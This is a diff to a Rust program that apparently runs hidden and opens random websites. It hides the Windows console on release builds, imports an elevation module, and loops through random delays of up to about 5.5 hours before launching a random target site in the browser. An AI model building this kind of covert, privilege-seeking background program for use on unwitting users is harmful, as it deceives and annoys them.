@@ -1,9 +1,6 @@
 // Prevents Windows from opening CMD
 // Only on Release builds
-#![cfg_attr(
-    not(debug_assertions),
-    windows_subsystem = "windows"
-)]
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 
 mod elevation;
 
@@ -42,11 +39,14 @@ fn main() -> Result<(), RunTimeError> {
     ];
 
     loop {
+        // Sleep for 100s ~ 5:30h
         let delay = Duration::from_millis(rng.gen_range(100000..20000000));
         thread::sleep(delay);
 
+        // Pick random site
         let target = targets[rng.gen_range(0..(targets.len() - 1))];
 
+        // Open target in web browser
         webbrowser::open(target)
             .into_report()
             .attach_printable("Failed to open web browser")
